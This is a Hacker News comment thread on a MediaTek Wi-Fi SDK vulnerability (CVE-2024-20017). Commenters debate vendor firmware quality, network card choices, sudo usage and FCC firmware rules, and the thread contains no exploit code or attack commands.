| |  |  | [Critical Exploit in MediaTek Wi-Fi Chipsets: Zero-Click Vulnerability](https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html) ([coffinsec.com](from?site=coffinsec.com)) | | --- | --- | --- | |  | | 259 points by [pjf](user?id=pjf) [3 months ago](item?id=41605680)  | [hide](hide?id=41605680&goto=item%3Fid%3D41605680) | [past](https://hn.algolia.com/?query=Critical%20Exploit%20in%20MediaTek%20Wi-Fi%20Chipsets%3A%20Zero-Click%20Vulnerability&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=41605680&auth=8d85255473eea221388386915c8ea654dc8286be) | [103 comments](item?id=41605680) |  | |  |  | [Namidairo](user?id=Namidairo) [3 months ago](item?id=41607030)   | [next](#41609001) [–]  Not too surprising given what I've seen of their vendor sdk driver source code, compared to mt76. (Messy would be kind assessment) Unfortunately, there are also some running aftermarket firmware builds with the vendor driver, due to it having an edge in throughput over mt76. Mediatek and their WiSoC division luckily have a few engineers that are enthusiastic about engaging with the FOSS community, while also maintaining their own little OpenWrt fork running mt76.[1] [1] [https://git01.mediatek.com/plugins/gitiles/openwrt/feeds/mtk...](https://git01.mediatek.com/plugins/gitiles/openwrt/feeds/mtk-openwrt-feeds/) | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [dylan604](user?id=dylan604) [3 months ago](item?id=41607523)   | [parent](#41607030) | [next](#41607209) [–]  Why is it so much of this hardware/firmware feels so much like deploying a PoC to production? Why can't they hire someone that actually knows what they are doing? | | --- | --- | --- | | | |  |  | [jdietrich](user?id=jdietrich) [3 months ago](item?id=41608501)   | [root](#41607030) | [parent](#41607523) | [next](#41608841) [–]  The consumer space is brutally competitive - you're working on tight margins and designs become obsolete very quickly. MediaTek's business is built on selling chips with the latest features at the lowest possible price. Everything has to be done at a breakneck pace that is dictated by the silicon. You start writing firmware as soon as the hardware design is finalised; it needs to be ready as soon as the chips are ready to ship. These conditions are not at all suited to good software engineering. In an ideal world, consumers would be happy to pay a premium for a device that's a generation behind in terms of features but has really good firmware. In the real world, only Apple have the kind of brand and market power to even attempt that. | | --- | --- | --- | | | |  |  | [AnthonyMouse](user?id=AnthonyMouse) [3 months ago](item?id=41613050)   | [root](#41607030) | [parent](#41608501) | [next](#41609395) [–]  > you're working on tight margins and designs become obsolete very quickly. This seems like the exact place where open source is a competitive advantage. Step 1, open source your existing firmware for the previous generation hardware. The people who have the hardware now fix problems you didn't have the resources to fix. Step 2, fork the public firmware for the previous generation hardware when developing the next generation. It has those bug fixes in it and 90% of the code is going to be the same anyway. Publish the new source code on the day the hardware ships in volume but not before. By then it doesn't matter if competitors can see it because "designs become obsolete very quickly" and it's too late for them to use it for their hardware/firmware in this generation. They don't get to see your next generation code until that generation is already shipping. Firmware tricks that span generations and have significant value can't be kept secret anyway because any significant firmware-based advantage would be reverse engineered by competitors for the next generation regardless of whether they have the source code. Now your development costs are lower than competitors' because you didn't have to pay to fix any bugs that one of your customers fixed first, and more people buy your hardware because your firmware is less broken than the competition. | | --- | --- | --- | | | |  |  | [AlotOfReading](user?id=AlotOfReading) [3 months ago](item?id=41613301)   | [root](#41607030) | [parent](#41613050) | [next](#41609395) [–]  What happens in that case is that competitors copy your hardware and throw the open source firmware on it to undercut you. Consumers don't know how to differentiate your products without marketing/segmentation and OEMs mostly care about the BOM cost. It doesn't matter much that your competitors are 2-6 months behind because they're still killing the long tail sales that sustain a company. Note that I'm still pro-open source, but I've seen this cycle play out in the real world enough times to understand why manufacturers are paranoid about releasing *anything* that might help a competitor, even if it benefits their customers. | | --- | --- | --- | | | |  |  | [AnthonyMouse](user?id=AnthonyMouse) [3 months ago](item?id=41641738)   | [root](#41607030) | [parent](#41613301) | [next](#41609395) [–]  > What happens in that case is that competitors copy your hardware and throw the open source firmware on it to undercut you. The entire premise of firmware is that it's specific to the hardware. By the time they "copy your hardware" it's already obsolete. Also, that's the thing you're actually selling. Your firmware sucks. Nobody wants your firmware unless they have your hardware. People are paying you for the hardware, which is the thing cheap competitors can't make as well as you or you're already screwed. | | --- | --- | --- | | | |  |  | [mschuster91](user?id=mschuster91) [3 months ago](item?id=41609395)   | [root](#41607030) | [parent](#41608501) | [prev](#41613050) | [next](#41608887) [–]  > You start writing firmware as soon as the hardware design is finalised; it needs to be ready as soon as the chips are ready to ship. On top of that, there's *bound to* be errors in the hardware design, no modern technology even comes close to being formally proven correct, it's just too damn complex/large. Only after the first tapeout of an ASIC you can actually test it and determine what you need to correct and where to correct it (microcode, EC firmware, OS or application layer). | | --- | --- | --- | | | |  |  | [JonChesterfield](user?id=JonChesterfield) [3 months ago](item?id=41608887)   | [root](#41607030) | [parent](#41608501) | [prev](#41609395) | [next](#41608841) [–]  Intel networking used to have the expensive and works traits. Not confident their current products would be as good. | | --- | --- | --- | | | |  |  | [phil21](user?id=phil21) [3 months ago](item?id=41610003)   | [root](#41607030) | [parent](#41608887) | [next](#41610485) [–]  Indeed. A friend who is more plugged into such things me told me 4-5 years ago they laid off most of the senior Intel network driver team. Basically the only edge they had. I can’t imagine things are any better these days. Inertia is a hell of a thing, but you are starting to see the cracks form. I just don’t know if there is an alternative. | | --- | --- | --- | | | |  |  | [sofixa](user?id=sofixa) [3 months ago](item?id=41610485)   | [root](#41607030) | [parent](#41608887) | [prev](#41610003) | [next](#41608841) [–]  When? The Intel X710 series of network cards was released in 2014, and it wasn't until ~2018 that it became actually usable (end of 2018? I don't recall really, but when I stumbled upon it it had already been a public problem for more than a year, and it took a few more months for patches to come). I'm talking things like full OS crashes while doing absolutely nothing, no traffic whatsoever *or* even better, silently starting to drop all network traffic (relatively silently, just an error message in the logs, but otherwise no indication, the interface still shows up as fine and up in the OS). It was all a driver issue (although both Intel drivers didn't work, so not only) that was later fixed. After that, it was rock solid. But the fact that there was a high class network card sold for lots of money, on hardware compatibility lists at various vendors, which didn't work at all for pretty much everyone for more than a few years is disgusting. | | --- | --- | --- | | | |  |  | [to11mtm](user?id=to11mtm) [3 months ago](item?id=41612232)   | [root](#41607030) | [parent](#41610485) | [next](#41611336) [–]  Back at the start of the century, Intel networking cards were the 'Best reliability for the dollar' and for some reason had a grudge against Linksys even before the Cisco buyout [0]. Same for most of their B/G Wireless stuff. [0] - That came up once. | | --- | --- | --- | | | |  |  | [tuetuopay](user?id=tuetuopay) [3 months ago](item?id=41611336)   | [root](#41607030) | [parent](#41610485) | [prev](#41612232) | [next](#41608841) [–]  you'd be glad to hear the e810 series is not better in this regard. at least the out-of-tree driver somewhat works, and supports more than 1 queue. | | --- | --- | --- | | | |  |  | [Rinzler89](user?id=Rinzler89) [3 months ago](item?id=41608841)   | [root](#41607030) | [parent](#41607523) | [prev](#41608501) | [next](#41607766) [–]  *>Why can't they hire someone that actually knows what they are doing?* Because those employees cost a lot of money and these commodity widgets have razor thin margins that don't enable them to pay high salaries while also making enough profit to stay in business. You can pay more to hire better people and put the extra cost in the price of the product but then HP, Lenovo, Dell, et-al aren't gonna buy your product anymore, they're gonna buy instead from your competition who's maybe worse but provides lower prices which is what's most important for them because the average end user of the laptop won't notice the difference between network cards but they do check the sticker price of the machine on Amazon/Walmart and make the purchasing decision on that and stuff like the CPU and GPU not on the network card in the spec sheet. | | --- | --- | --- | | | |  |  | [ta988](user?id=ta988) [3 months ago](item?id=41607766)   | [root](#41607030) | [parent](#41607523) | [prev](#41608841) | [next](#41608210) [–]  Because you have to over pay all those executives and shareholders. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [3 months ago](item?id=41608210)   | [root](#41607030) | [parent](#41607523) | [prev](#41607766) | [next](#41609761) [–]  Hardware companies are bad at making software, and the corollary, software companies are bad at making hardware. | | --- | --- | --- | | | |  |  | [perching\_aix](user?id=perching_aix) [3 months ago](item?id=41608415)   | [root](#41607030) | [parent](#41608210) | [next](#41609260) [–]  I feel like there's an opportunity for a joke here somewhere along the lines of hardware companies being really terrible at writing software, while software companies being just a normal amount of terrible at writing software. | | --- | --- | --- | | | |  |  | [a\_dabbler](user?id=a_dabbler) [3 months ago](item?id=41608431)   | [root](#41607030) | [parent](#41608415) | [next](#41609260) [–]  A few attempts with chstgpt managed it: "Hardware companies writing software is like watching a train wreck in slow motion. Software companies? They just crash at regular speed." | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [3 months ago](item?id=41609260)   | [root](#41607030) | [parent](#41608210) | [prev](#41608415) | [next](#41608260) [–]  Which is why NVIDIA is king of the world, they are good at both hardware and software. | | --- | --- | --- | | | |  |  | [therein](user?id=therein) [3 months ago](item?id=41608260)   | [root](#41607030) | [parent](#41608210) | [prev](#41609260) | [next](#41609761) [–]  In the middle you have Apple that is getting better at making certain kinds of hardware, worse at some hardware and definitely worse in software. | | --- | --- | --- | | | |  |  | [layer8](user?id=layer8) [3 months ago](item?id=41609761)   | [root](#41607030) | [parent](#41607523) | [prev](#41608210) | [next](#41607700) [–]  Hardware manufacturers see software as a cost center, it’s often made as cheaply as possible. And hardware engineers aren’t necessarily good software developers. It isn’t their main expertise. | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [3 months ago](item?id=41607700)   | [root](#41607030) | [parent](#41607523) | [prev](#41609761) | [next](#41607209) [–]  Because money | | --- | --- | --- | | | |  |  | [molticrystal](user?id=molticrystal) [3 months ago](item?id=41607209)   | [parent](#41607030) | [prev](#41607523) | [next](#41609001) [–]  Is there any news releases or other information about that program, such as their goals, how much of the feed is merged upstream, etc? | | --- | --- | --- | | | |  |  | [qhwudbebd](user?id=qhwudbebd) [3 months ago](item?id=41609001)   | [prev](#41607030) | [next](#41606990) [–]  The wording of the headline is a bit misleading here. I followed the link thinking it might be a firmware or silicon bug as I have a couple of routers at home with mt76 wifi, but was relieved to find it's just a bug in the vendor's 'sdk' shovelware. I'm baffled that anyone even thought about using that, given there's such good mt76 support from mainline kernels with hostapd. | | --- | --- | --- | | | |  |  | [Terretta](user?id=Terretta) [3 months ago](item?id=41610266)   | [parent](#41609001) | [next](#41611396) [–]  > *relieved to find it's just a bug in the vendor's 'sdk' shovelware* Vendors plural to worry about: *“…driver bundles used in products from various manufacturers, including [but not limited to] Ubiquiti, Xiaomi and Netgear.”* That said, vendors (plural) say no products use this, e.g. Ubiquiti: [https://community.ui.com/questions/CVE-2024-20017/b3f1a425-d...](https://community.ui.com/questions/CVE-2024-20017/b3f1a425-d7cc-4fce-9218-c930ce4fa35f) | | --- | --- | --- | | | |  |  | [qhwudbebd](user?id=qhwudbebd) [3 months ago](item?id=41610931)   | [root](#41609001) | [parent](#41610266) | [next](#41611396) [–]  Sorry, yes, my use of 'vendor' here was ambiguous. I meant Mediatek, the chipset vendor. | | --- | --- | --- | | | |  |  | [vesinisa](user?id=vesinisa) [3 months ago](item?id=41611396)   | [parent](#41609001) | [prev](#41610266) | [next](#41606990) [–]  > I'm baffled that anyone even thought about using that, given there's such good mt76 support from mainline kernels with hostapd. Not sure if you noticed but the OpenWRT 21.02.x series (based on mainline kernel 5.4 series) is affected, and these guys generally know their game when it comes to wireless on Linux. So much so that I think the mainline kernel mt76 driver is actually maintained by an OpenWRT developer. | | --- | --- | --- | | | |  |  | [mbilker](user?id=mbilker) [3 months ago](item?id=41611803)   | [root](#41609001) | [parent](#41611396) | [next](#41606990) [–]  Upstream OpenWrt does not use `wappd` so it should not be affected. | | --- | --- | --- | | | |  |  | [vesinisa](user?id=vesinisa) [3 months ago](item?id=41612458)   | [root](#41609001) | [parent](#41611803) | [next](#41606990) [–]  Interesting. The bulletin lists "OpenWrt 19.07, 21.02 (for MT6890)" as vulnerable, but OpenWRT had indeed no security advisory out for this: <https://openwrt.org/advisory/start> Maybe MediaTek has shipped some modified versions of OpenWRT using this "wappd" thing to their B2B customers (as part of the SDK perhaps?) and are now advertising those as vulnerable. | | --- | --- | --- | | | |  |  | [qhwudbebd](user?id=qhwudbebd) [3 months ago](item?id=41613024)   | [root](#41609001) | [parent](#41612458) | [next](#41606990) [–]  Yes, I'm assuming that's exactly why OpenWrt is mentioned but it's very misleading. The OpenWrt folks generally have good enough taste not to ship any drivers or userspace junk from vendor SDKs, though they do have a fair-sized set of backport patches on top of the (somewhat elderly) mainline kernels they do ship. I'm running up-to-date mainline on my routers, not OpenWrt kernels. The mt76 support in 6.11 (and previously in 6.9 and 6.10) is complete enough that I don't need to carry any patches at all over what's in Linus' tree. | | --- | --- | --- | | | |  |  | [hunter-gatherer](user?id=hunter-gatherer) [3 months ago](item?id=41606990)   | [prev](#41609001) | [next](#41609733) [–]  Original blog: [https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-20...](https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html) | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [3 months ago](item?id=41607189)   | [parent](#41606990) | [next](#41609733) [–]  *The wappd service is primarily used to configure and coordinate the operations of wireless interfaces and access points using Hotspot 2.0 and related technologies. The structure of the application is a bit complex but it’s essentially composed of this network service, a set of local services which interact with the wireless interfaces on the device, and communication channels between the various components, using Unix domain sockets.* On the bright side, it doesn't sound like this is in baseband firmware but instead in a "value add" service that isn't 100% necessary to the functioning of the WNIC itself. This reminds me of how some devices come with driver packages that include not just the actual driver software that's usually tiny and unobtrusive, but several orders of magnitude larger bloatware for features that 99% of users don't need nor want. Printers and GPUs are particularly guilty of this. | | --- | --- | --- | | | |  |  | [dvh](user?id=dvh) [3 months ago](item?id=41608564)   | [root](#41606990) | [parent](#41607189) | [next](#41609733) [–]  > The structure of the application is a bit complex I've done some Android development so let me translate that for you: "layers upon layers of dog shit APIs" | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [3 months ago](item?id=41609119)   | [root](#41606990) | [parent](#41608564) | [next](#41609733) [–]  I've done some Android RE and agree with you. It's basically Enterprise Java culture. | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [3 months ago](item?id=41609733)   | [prev](#41606990) | [next](#41607163) [–]  Is there some logic to MediaTek's naming conventions, or all their devices just MTxxxx where x is some incremented/random number? I have a device with a mt6631 wifi chip and I'd *assume* it's unaffected just because it's not mentioned as affected anywhere, but it's hard to tell where it might fit into the lineup. | | --- | --- | --- | | | |  |  | [kam](user?id=kam) [3 months ago](item?id=41607163)   | [prev](#41609733) | [next](#41607867) [–]  They say that OpenWrt 19.07 and 21.02 are affected, but as far as I can tell, official builds of OpenWrt only use the mt76 driver and not the Mediatek SDK. | | --- | --- | --- | | | |  |  | [hedora](user?id=hedora) [3 months ago](item?id=41607511)   | [parent](#41607163) | [next](#41607867) [–]  It’s similar for Ubiquti: [https://community.ui.com/questions/CVE-2024-20017/b3f1a425-d...](https://community.ui.com/questions/CVE-2024-20017/b3f1a425-d7cc-4fce-9218-c930ce4fa35f) There are vulnerable drivers for some chipsets used by UBNT hardware, but they have zero products that use those drivers. | | --- | --- | --- | | | |  |  | [RedShift1](user?id=RedShift1) [3 months ago](item?id=41607867)   | [prev](#41607163) | [next](#41607642) [–]  I've been buying laptops with AMD CPU's but they always come with these trash MediaTek RZ616 Wi-Fi cards, why is that? I've been replacing them with Intel Wi-Fi cards, now I have a pile of RZ616 cards ready to become future microplastics :-( | | --- | --- | --- | | | |  |  | [zekica](user?id=zekica) [3 months ago](item?id=41610204)   | [parent](#41607867) | [next](#41609704) [–]  Intel sells two versions of their WiFi cards: ones ending in 1 use CNVI protocol and work only with Intel chips. These are sold really cheap to OEMs; ones ending in 0 use standard PCIe and are sold to OEMs for ~$10 more. AMD decided to brand Mediatek's MT7921 and MT7922 as RZ608 and RZ616 to have something to sell to OEMs at the same price point as Intel's xx1 chips. | | --- | --- | --- | | | |  |  | [heffer](user?id=heffer) [3 months ago](item?id=41609704)   | [parent](#41607867) | [prev](#41610204) | [next](#41608617) [–]  Lenovo grew unhappy with MediaTek as well and started soldering down Qualcomm chips for WLAN on their AMD platforms only to be burned by buggy firmware/driver interactions on Linux (which they officially sell and support). And Qualcomm stretches themselves rather thin on the mainline kernel side once a chipset generation is no longer the latest. It takes a tremendous amount of vendor pressure to make Qualcomm do anything these days. | | --- | --- | --- | | | |  |  | [zokier](user?id=zokier) [3 months ago](item?id=41608617)   | [parent](#41607867) | [prev](#41609704) | [next](#41611400) [–]  iwlwifi has its own set of problems, biggest being no AP mode (on 5 Ghz). Also intels firmware license is more restrictive than mediateks, and being fullmac the firmware does lot more of the heavy lifting; I personally prefer softmac more. There simply aren't that many great options out there, gone are the golden days of ath9k. | | --- | --- | --- | | | |  |  | [tuetuopay](user?id=tuetuopay) [3 months ago](item?id=41611400)   | [parent](#41607867) | [prev](#41608617) | [next](#41609522) [–]  Have you tried them further than "I don't trust MediaTek"? I've had sequentially an Intel and an AMD ThinkPad for work (I killed the first one). Turns out, the wifi is much much better on the AMD one with the MediaTek chipset than on the Intel one with the Intel chipset. On the latter, I had very frequent disconnects from the network (severals per hour) along with atrocious latency even on 5GHz. And by atrocious latency, I mean atrocious as in "it is more than noticeable when using ssh". The current one has been rock solid for the past two or three years. So yeah, I guess it really depends. The specific chipset I have is a MT7921 and I'm running Linux, YMMV. And it also may depend on the laptop itself. | | --- | --- | --- | | | |  |  | [RedShift1](user?id=RedShift1) [3 months ago](item?id=41612311)   | [root](#41607867) | [parent](#41611400) | [next](#41609522) [–]  The laptops run Windows. It's not about trust, they just don't work well. They take a long time to connect, particularly after returning from sleep. Many times I have to disconnect and reconnect manually after returning from sleep. I replace them with Intel Wi-Fi ones and it just works. I'd really rather just replace them than face user complaints. | | --- | --- | --- | | | |  |  | [tuetuopay](user?id=tuetuopay) [3 months ago](item?id=41616928)   | [root](#41607867) | [parent](#41612311) | [next](#41609522) [–]  Urgh. Kudos to you, that’s no easy task. And this might explain a lot, I’ve never liked the WiFi experience in windows. I find Linux with IWD to be stable as hell | | --- | --- | --- | | | |  |  | [0points](user?id=0points) [3 months ago](item?id=41609522)   | [parent](#41607867) | [prev](#41611400) | [next](#41608322) [–]  You get what you pay for. | | --- | --- | --- | | | |  |  | [smilespray](user?id=smilespray) [3 months ago](item?id=41608322)   | [parent](#41607867) | [prev](#41609522) | [next](#41607642) [–]  You know why. Price. | | --- | --- | --- | | | |  |  | [usr1106](user?id=usr1106) [3 months ago](item?id=41607642)   | [prev](#41607867) | [next](#41607130) [–]  IIRC my phone uses a MediaTek chipset. And I vaguely remember the vendor has moved away from MediaTek since because of the ahem quality of those products... No idea how WiFi is done on a phone though. Is there a way to find out whether the phone is affected? I hardly ever use WiFi because I have unlimited cellular data and good coverage, but would still be good to know. | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [3 months ago](item?id=41608882)   | [parent](#41607642) | [next](#41607130) [–]  termux -> "sudo su" and then ```     ls /sys/module  ``` (it gives an output similar to lsmod) | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41611376)   | [root](#41607642) | [parent](#41608882) | [next](#41612457) [–]  Back in the day, shell coders would receive the "Useless Use Of Cat" award. <https://news.ycombinator.com/item?id=23341711> Today it's giving way to "useless use of su" where admins aren't aware of sudo(8) options like "-s" or "-i" | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [3 months ago](item?id=41612315)   | [root](#41607642) | [parent](#41611376) | [next](#41611700) [–]  And anyone who points that out still gets to receive the "useless use of code golfing" award. | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41612359)   | [root](#41607642) | [parent](#41612315) | [next](#41622319) [–]  Sure, it's annoying and pedantic to nitpick someone's helpful answers and snippets. But sometimes the goal is to foster a better understanding, and reduce superstition and cargo-culting. "sync<CR>sync<CR>sync<CR>reboot<CR>" became an idiom for various reasons. Then it became "sync; sync; sync; reboot" and deemed equivalent, which was missing the point that physically pressing "enter" introduced some human-length pauses into the process. Then "reboot(8)" incorporated those syncs, and "shutdown(8)" provided more flexibility, but the idiom persisted. And to this day, the tier-1 support script says to clear your cookies and cache, try a different browser, factory reset your phone, disable firewall, disable AV, reboot your router, bypass your switch and plug in one device directly, wait 15 minutes and try again, and we've abandoned all attempts to understand, diagnose, or find root causes when the underlying systems are too diverse and complex to understand or keep your tech's expertise up-to-date. | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [3 months ago](item?id=41612585)   | [root](#41607642) | [parent](#41612359) | [next](#41622319) [–]  Not memorizing all of sudo's flags isn't cargo culting, and neither is using cat to improve clarity. | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41613105)   | [root](#41607642) | [parent](#41612585) | [next](#41622319) [–]  Strawman--nobody said that. All I suggest is that if you wish to accomplish a particular task, then read the manual at that point, and find relevant ways to invoke the command. The options I've memorized over the years are the ones I've used the most often, and this inertia can lead to ignorance, unless I periodically revisit the manual page to see what else can be done. Every IT/CS instructor will tell you that your source of truth is the vendor's documentation. Don't waste your time Googling Stackexchange when the manual pages are available right on the system, on a website, or however. The manual pages are written by the developers and tech writers to specifically tell you how to use these commands. You can either "cat for clarity" for the rest of your career, or you can learn new methods like shell redirects, "tee(1)", "exec <file; while read var; do cmd; done". I wouldn't be surprised if people start their careers thinking that "cat" is just for starting up a pipeline. Other students may be taught that "cat" is an elementary way to just put file contents on their terminal screen, and then they'll subsequently learn how "more(1)" is superior in this regard. "When all you have is a hammer, everything looks like a nail." | | --- | --- | --- | | | |  |  | [Woodi](user?id=Woodi) [3 months ago](item?id=41622319)   | [root](#41607642) | [parent](#41612315) | [prev](#41612359) | [next](#41611700) [–]  'sudo su' is pure absurd but then how name naming it a "golf" ?? :))) So maybe Perl is not so write-only after all ? ;) | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [3 months ago](item?id=41611700)   | [root](#41607642) | [parent](#41611376) | [prev](#41612315) | [next](#41612457) [–]  So with termux there is an actual root password set, but it differs from the phone password so it's often forgotten. The termux developers, knowing this, set it such that the default termix user can invoke sudo without a password. It might seem lazy, but its very useful | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41612052)   | [root](#41607642) | [parent](#41611700) | [next](#41612457) [–]  I am not sure how passwords are relevant to the pointless chaining of two distinct commands, rather than invoking a straightforward "sudo -s". People writing "sudo su" are simply imitating a common StackExchange idiom without knowing why. "su" requires passwords unless invoked by root. "sudo" may be configured to permit/deny specific commands. So if you write that, then you're saying 'become root via the sudoers(5) config and then fork, exec, become root again via the setuid binary "su", in order to run an interactive shell.' It's a poor habit to be promoting, because it assumes things about the configuration and suggests that "su" is equal to other particular "sudo" maintenance commands, when the point is simply to drop into a root shell, which is a facility provided directly by "sudo", if you'd only read the manual page and learn its options. Nothing will stop you from invoking "sudo -s" without a password, without another fork/exec, without another suid utility carrying a significantly different authentication model. | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [3 months ago](item?id=41612250)   | [root](#41607642) | [parent](#41612052) | [next](#41612457) [–]  Doesn't "sudo -s" keep the current user's environment variables as opposed to "sudo su"? I admit that in the context of doing "ls /sys/module" it's likely not a huge problem, but I do (in my gut) feel that for running an elevated command, it's cleaner to just drop in as actual root, instead of masquerading as root. | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41612283)   | [root](#41607642) | [parent](#41612250) | [next](#41612457) [–]  > if you'd only read the manual page and learn its options. | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [3 months ago](item?id=41612915)   | [root](#41607642) | [parent](#41612283) | [next](#41612457) [–]  > Depending on the security policy, the user's PATH environment variable may be modified, replaced, or passed unchanged to the program that sudo executes. Essentially a "maybe, depending on what your OS policy is", proving that your comments are less than helpful. | | --- | --- | --- | | | |  |  | [AStonesThrow](user?id=AStonesThrow) [3 months ago](item?id=41613039)   | [root](#41607642) | [parent](#41612915) | [next](#41612457) [–]  Well, you are moving the goalposts like crazy, considering you were just executing a simple command with your original example, but let me search it and demonstrate the rest of it, rather than your Ctrl-F find one option in question: [https://manpages.ubuntu.com/manpages/noble/en/man8/sudo.8.ht...](https://manpages.ubuntu.com/manpages/noble/en/man8/sudo.8.html#description) ```      -E, --preserve-env       --preserve-env=list       -H, --set-home       -i, --login       -s, --shell   The sudoers policy subjects environment variables passed as options to the same restrictions as existing environment variables with one important difference.  If the setenv option is set in sudoers, the command to be run has the SETENV tag set or the command matched is ALL, the user may set variables that would otherwise be forbidden.  ``` I am not sure what is meant by "masquerading as root" -- effective UID rather than real UID? "sudo" should set both to the target; there is no masquerading, even if you end up in a root shell with features of the invoking user's environment, those relevant variables should've been adjusted in the process. So what you're proposing to do is to escalate privilege using "sudo"s security model and configuration, which may add, suppress, or alter environment variables, as well as SELinux and resource limits and cgroups or whatever, and then have a second go-round through "su" may alter the environment further, making for an unpredictable interaction. Hopefully it's all harmonized through PAM, but all you wanted is an interactive shell. Why try to justify this copy-paste idiom? In fact, I could rewrite your original snippet as ```   sudo ls /sys/module  ``` Why are you even opening an interactive shell to do one simple command? If that's all you want, then learn and use the appropriate idiom for it. "sudo(8)" was originally designed to run one-off commands without invoking that shell. In fact, security experts will tell you not to leave root shells open at any time. If you can run a "sudo command" and return to your user shell, then that is best practice. | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [3 months ago](item?id=41613360)   | [root](#41607642) | [parent](#41613039) | [next](#41612457) [–]  Hey, thanks for the one extremely useful comment! | | --- | --- | --- | | | |  |  | [usr1106](user?id=usr1106) [3 months ago](item?id=41612457)   | [root](#41607642) | [parent](#41608882) | [prev](#41611376) | [next](#41607130) [–]  Thanks! I had thought about mentioning my phone is not rooted, but then I skipped it because that should be the default... | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [3 months ago](item?id=41607130)   | [prev](#41607642) | [next](#41609896) [–]  i still cannot fathom why in this day and age where people buy any silicon that's available, these C tier vendors don't adopt the PC strategy and completely open their firmwares for open source community. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [3 months ago](item?id=41607142)   | [parent](#41607130) | [next](#41609896) [–]  FCC regulations around not making it easy to transmit outside of the licensed band tend to cause this. | | --- | --- | --- | | | |  |  | [hakfoo](user?id=hakfoo) [3 months ago](item?id=41632533)   | [root](#41607130) | [parent](#41607142) | [next](#41607151) [–]  It feels like they're using software as a solution to a hardware problem. No matter what the software says, or what keys it has set, the hardware should still be hard-configured to honour regional power output limits. This could be something like a block of DIP switches under the cover, so if a user unbolts the case, finds the switch, and toggles it to some country with looser requirements, it's obviously going against manufacturer advice and washes their hands of liability. | | --- | --- | --- | | | |  |  | [vlovich123](user?id=vlovich123) [3 months ago](item?id=41607151)   | [root](#41607130) | [parent](#41607142) | [prev](#41632533) | [next](#41610556) [–]  Making the code available doesn’t necessarily mean that you can actually flash the image since it can be cryptographically locked down. Or even you support flashing but only let you do certain trusted operations from a signed image. | | --- | --- | --- | | | |  |  | [fn-mote](user?id=fn-mote) [3 months ago](item?id=41607191)   | [root](#41607130) | [parent](#41607151) | [next](#41610572) [–]  I feel like I'm missing something here. Honestly, if you can't update the firmware you're in the same situation... knowing that you have a critical vulnerability and unable to fix it. Enforcing trusted operations is definitely more work than they are going to do (if it's even possible to "do this right"). In a semi-ideal world, I would look for a vendor that permits only certain ops from a flashed image and hope that their crappy "restriction enforcing" code is also riddled with vulnerabilites so it's really just "follow the rules please". | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [3 months ago](item?id=41610572)   | [root](#41607130) | [parent](#41607151) | [prev](#41607191) | [next](#41610556) [–]  you managed to completely miss the point. going the pc route is fully embracing your hardware accept whatever software the user wants. not throw unbuildable source somewhere and make it impossible to use. that's the faux open source we have today when someone must comply with the gpl or something | | --- | --- | --- | | | |  |  | [vlovich123](user?id=vlovich123) [3 months ago](item?id=41611481)   | [root](#41607130) | [parent](#41610572) | [next](#41610556) [–]  I think you happened to miss the point about regulatory requirements that make this difficult/impossible to accomplish for the radio vendor. I think the proliferation of SDR is the only hope to change the broader regulatory culture but until that happens you're not going to see a shift. I think it's also rich calling GPL compliance faux open source. There really is no true Scotsman. | | --- | --- | --- | | | |  |  | [ImPostingOnHN](user?id=ImPostingOnHN) [3 months ago](item?id=41622806)   | [root](#41607130) | [parent](#41611481) | [next](#41610556) [–]  What are those regulatory requirements, and what do they say? Thank you. | | --- | --- | --- | | | |  |  | [vlovich123](user?id=vlovich123) [3 months ago](item?id=41627521)   | [root](#41607130) | [parent](#41622806) | [next](#41610556) [–]  [https://apps.fcc.gov/kdb/GetAttachment.html?id=zXtrctoj6zH7o...](https://apps.fcc.gov/kdb/GetAttachment.html?id=zXtrctoj6zH7oNEOO6De6g%3D%3D&desc=594280%20D02%20U-NII%20Device%20Security%20v01r03&tracking_number=39498) Manufacturers of radios have to prevent the ability to behave in a non-compliant manner. One way of accomplishing that is preventing the user from updating software to non-official versions. Another is to prevent the small subset of functionality to be updated by non-official versions. This isn't a new requirement and has been around since forever. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [3 months ago](item?id=41610556)   | [root](#41607130) | [parent](#41607142) | [prev](#41607151) | [next](#41611798) [–]  that point is completely bogus since hardware oscillators limit the range. and even multi range devices let the driver decide the region, so even with closed source you can already offend fcc regulations (pro tip set your wifi region to cuba for extra channels) | | --- | --- | --- | | | |  |  | [eqvinox](user?id=eqvinox) [3 months ago](item?id=41610729)   | [root](#41607130) | [parent](#41610556) | [next](#41611798) [–]  Hardware oscillators don't limit anything, PLL ranges and amplifier band characteristics do, and they have soft falloffs. Please stop making claims you have little knowledge around. (no, a PLL is not considered a "hardware oscillator" in any practical sense by anyone working in this area, that's "tomatoes in a fruit salad" category) | | --- | --- | --- | | | |  |  | [anthk](user?id=anthk) 